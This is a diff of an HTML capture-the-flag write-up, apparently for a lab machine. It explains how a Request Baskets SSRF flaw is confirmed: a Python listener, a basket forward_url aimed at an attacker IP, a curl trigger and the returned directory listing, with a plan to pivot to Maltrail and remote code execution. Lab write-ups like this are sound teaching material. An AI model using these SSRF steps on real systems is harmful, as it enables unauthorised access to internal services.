@@ -192,19 +192,111 @@ We created a new basket via <code>curl</code>:</p>
     <img src="path/to/burp-screenshot.png" alt="Burp PUT Request Screenshot">
 
 <p>Now can can grab the request in burp and send it to repeater</p>
-    <pre><code>{
-  "forward_url": "http://10.10.14.207:8000",
-  "proxy_response": true,
-  "insecure_tls": true
-}</code></pre>
+ 
+<img src="path/to/burp-screenshot.png" alt="Burp PUT Request Screenshot">
 
-    <p>We spun up a Python HTTP server:</p>
-    <pre><code>python3 -m http.server 8000</code></pre>
+<h2>What Happens When You do This?</h2>
+<ul>
+  <li>The server creates a basket called <code>hackbox</code></li>
+  <li>It responds with a <code>token</code> (used as an API key for authorization)</li>
+  <li>You can now use that basket to:
+    <ul>
+      <li>View or store intercepted requests</li>
+      <li>Modify its behavior (i.e., add SSRF forwarding!)</li>
+    </ul>
+  </li>
+</ul>
 
-    <p>Then triggered the SSRF by browsing to the basket:</p>
-    <pre><code>curl http://10.129.229.26:55555/hackbox</code></pre>
+<h3>Verifying SSRF</h3>
 
-    <p>✅ <strong>SSRF confirmed</strong> — the remote server hit our HTTP server!</p>
+<p>We’re leveraging a vulnerability in the <code>/api/baskets/{name}</code> endpoint of Request Baskets, which allows us to configure arbitrary request forwarding — enabling Server-Side Request Forgery (SSRF).</p>
+
+<p>We set up a Python HTTP server on our attacker machine so we can catch inbound SSRF traffic:</p>
+
+<pre><code>python3 -m http.server 8000</code></pre>
+
+<p>This listens for incoming HTTP requests on port 8000. We'll use this to confirm whether the target server is making requests on our behalf.</p>
+
+<p>Next, we reconfigure our <code>hackbox</code> basket with a <code>PUT</code> request. This sets the <code>forward_url</code> to our attack box, which turns the basket into an SSRF relay:</p>
+
+<img src="path/to/burp-screenshot.png" alt="Burp PUT Request Screenshot">
+
+<h3>Explanation:</h3>
+<ul>
+  <li><code>forward_url</code>: Tells the server to <strong>forward any requests</strong> made to <code>/hackbox</code> to our attack box</li>
+  <li><code>proxy_response</code>: Allows us to <strong>see the response</strong> from the forwarded request</li>
+  <li><code>insecure_tls</code>: Bypasses HTTPS certificate validation (not used here, but good practice)</li>
+</ul>
+
+<p>This makes the vulnerable server act as a <strong>proxy</strong> — it will now contact whatever host we define in <code>forward_url</code>.</p>
+
+<p>With our listener running and the basket configured, we simply trigger the SSRF with:</p>
+
+<pre><code>curl http://10.129.229.26:55555/htb
+&lt;!DOCTYPE HTML&gt;
+&lt;html lang="en"&gt;
+&lt;head&gt;
+&lt;meta charset="utf-8"&gt;
+&lt;title&gt;Directory listing for /&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h1&gt;Directory listing for /&lt;/h1&gt;
+&lt;hr&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=".bash_aliases"&gt;.bash_aliases&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=".bashrc"&gt;.bashrc&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=".BurpSuite/"&gt;.BurpSuite/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=".cache/"&gt;.cache/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=".config/"&gt;.config/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=".dbeaver4/"&gt;.dbeaver4/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=".dbus/"&gt;.dbus/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=".emacs"&gt;.emacs&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=".gtkrc-2.0"&gt;.gtkrc-2.0&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=".ICEauthority"&gt;.ICEauthority&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=".java/"&gt;.java/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=".kde/"&gt;.kde/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=".local/"&gt;.local/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=".mozilla/"&gt;.mozilla/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=".msf4/"&gt;.msf4/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=".profile"&gt;.profile&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=".pyenv/"&gt;.pyenv/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=".sudo_as_admin_successful"&gt;.sudo_as_admin_successful&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=".vnc/"&gt;.vnc/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=".vscode/"&gt;.vscode/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=".Xauthority"&gt;.Xauthority&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=".xsession-errors"&gt;.xsession-errors&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=".zshrc"&gt;.zshrc&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="cacert.der"&gt;cacert.der&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="Desktop/"&gt;Desktop/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="Documents/"&gt;Documents/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="Downloads/"&gt;Downloads/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="Music/"&gt;Music/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="my_data/"&gt;my_data/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="Pictures/"&gt;Pictures/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="Public/"&gt;Public/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="Templates/"&gt;Templates/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="Videos/"&gt;Videos/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p><strong>SSRF confirmed.</strong></p>
+
+<p>This response proves that:</p>
+<ol>
+  <li>The target server made an HTTP request to <strong>our IP and port</strong></li>
+  <li>It sent the request <strong>from the target’s internal network</strong></li>
+  <li>The target returned <strong>our server’s response back to us</strong></li>
+</ol>
+
+<h3>Why It Matters:</h3>
+<ul>
+  <li>This behavior confirms a <strong>Server-Side Request Forgery</strong></li>
+  <li>We can now target <strong>internal services</strong> that we normally couldn’t reach from the outside (like <code>127.0.0.1:80</code>)</li>
+  <li>This will be our entry point to discovering <strong>Maltrail</strong> running on localhost and eventually getting RCE</li>
+</ul>
 
     <!-- ===== SSRF TO MALTRAIL ===== -->
     <h3>SSRF to Maltrail (Port 80)</h3>
